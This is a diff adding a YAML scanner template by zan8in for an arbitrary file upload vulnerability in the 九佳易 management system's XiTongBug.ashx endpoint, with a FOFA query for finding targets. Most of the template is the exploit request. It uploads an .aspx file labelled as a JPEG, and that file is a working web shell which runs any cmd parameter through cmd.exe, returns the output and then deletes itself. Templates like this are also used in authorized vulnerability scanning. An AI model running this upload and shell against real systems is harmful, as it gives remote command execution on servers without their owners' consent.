@@ -1,0 +1,46 @@
+id: jiujiayi-xitongbug-fileupload
+
+info:
+  name: 九佳易管理系统 XiTongBug.ashx 存在任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: false
+  description: |
+    fofa: body="4008-820-967"
+
+set:
+  rfilename: randomLowercase(20)
+  rbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /XiTongBug.ashx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{rfilename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <%
+        var c=new System.Diagnostics.ProcessStartInfo("cmd");
+        var e=new System.Diagnostics.Process();
+        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+        c.UseShellExecute=false;
+        c.RedirectStandardOutput=true;
+        c.RedirectStandardError=true;
+        e.StartInfo=c;
+        c.Arguments="/c " + Request.Item["cmd"];
+        e.Start();
+        out=e.StandardOutput;
+        EI=e.StandardError;
+        e.Close();
+        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+        System.IO.File.Delete(Request.PhysicalPath);
+        Response.End();%>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200 && response.body.bcontains(b'window.parent.CKEDITOR.tools.callFunction(')
+expression: r0()
